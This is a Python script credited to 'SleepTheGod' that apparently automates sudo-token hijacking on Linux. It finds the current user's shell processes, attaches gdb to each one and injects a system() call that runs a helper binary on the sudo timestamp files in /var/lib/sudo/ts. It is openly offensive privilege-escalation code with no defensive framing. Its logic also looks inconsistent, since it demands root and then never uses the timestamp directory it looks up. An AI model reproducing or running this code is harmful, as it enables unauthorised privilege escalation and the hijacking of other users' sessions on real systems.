import os
import subprocess
import psutil

# Made By SleepTheGod be sure to pip install psutil

def run_command(command):
    """Helper function to run shell commands."""
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def inject_sudo_token(pid):
    """Injects the sudo token activation into the process using gdb."""
    try:
        command = f'echo \'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")\' | gdb -q -n -p {pid} >/dev/null 2>&1'
        run_command(command)
    except Exception as e:
        print(f"Error injecting process {pid}: {e}")

def main():
    # Ensure the script is being run with root privileges
    if os.geteuid() != 0:
        print("This script must be run as root.")
        return

    # Copy the sudo token activation script to /tmp and make it executable
    subprocess.run(['cp', 'activate_sudo_token', '/tmp/'])
    subprocess.run(['chmod', '+x', '/tmp/activate_sudo_token'])

    # Get the timestamp directory for sudo (if it exists)
    try:
        timestamp_dir = subprocess.check_output("sudo --version | grep 'timestamp dir' | grep -o '/.*'", shell=True).decode().strip()
    except subprocess.CalledProcessError:
        print("Could not determine timestamp directory.")
        return

    # Iterate over processes owned by the current user and inject the sudo token
    for proc in psutil.process_iter(['pid', 'username', 'name']):
        if proc.info['username'] == os.getenv('USER') and proc.info['name'] in ['bash', 'zsh', 'dash', 'sh', 'csh', 'ksh', 'tcsh']:
            if proc.info['pid'] != os.getpid():  # Exclude the current script process
                print(f"Injecting process {proc.info['pid']} -> {proc.info['name']}")
                inject_sudo_token(proc.info['pid'])

if __name__ == "__main__":
    main()
